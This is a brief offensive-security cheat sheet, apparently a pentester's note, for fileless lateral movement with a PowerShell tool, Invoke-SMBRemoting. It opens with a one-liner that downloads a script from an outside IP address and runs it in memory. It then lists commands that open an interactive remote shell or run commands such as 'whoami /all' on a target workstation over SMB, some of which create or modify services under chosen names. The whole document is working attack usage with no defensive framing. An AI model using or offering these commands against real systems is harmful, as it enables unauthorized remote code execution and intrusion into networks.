# FileLess Lateral Movement - Powershell Implementation
*NOTE: We need admin access to SMB on the victim, can be abused using also injected kerberos ticket!*
- Invoke the script: `iex(iwr http://192.168.45.223/Invoke-SMBRemoting -UseBasicParsing)`

## Cheetsheet:
<ins>Interactive Shell</ins>
  - `Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local"`
  - `Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -PipeName Something -ServiceName RandomService`
  - `Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -ModifyService -Verbose`
  - `Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -ModifyService -ServiceName SensorService -Verbose`

<ins>Command Execution</ins>
- `Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -Command "whoami /all"`
- `Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -Command "whoami /all" -PipeName Something -ServiceName RandomService`
- `Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -Command "whoami /all" -ModifyService`
- `Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -Command "whoami /all" -ModifyService -ServiceName SensorService -Verbose`
